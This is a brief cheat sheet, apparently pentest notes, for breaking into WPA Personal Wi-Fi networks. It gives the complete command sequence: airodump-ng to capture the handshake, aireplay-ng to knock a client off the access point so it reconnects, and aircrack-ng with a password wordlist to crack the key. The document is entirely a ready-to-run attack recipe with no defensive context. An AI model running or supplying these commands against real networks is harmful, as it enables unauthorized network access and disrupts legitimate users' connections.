### WPA Personal
---
##### Capturing Handshakes:
```sh
sudo airodump-ng --channel <channel number> -w <output filename> --essid <ESSID> --bssid <BSSID> wlan0mon
```
- Keep this running in the background.

##### De-authenticate the client from the AP:
```sh
sudo aireplay-ng -0 4 -a <AP bssid> -c <Target Client bssid> wlan0mon
```

##### Cracking WPA Key:
``` sh
aircrack-ng <.cap file> -w /usr/share/john/password.lst
```

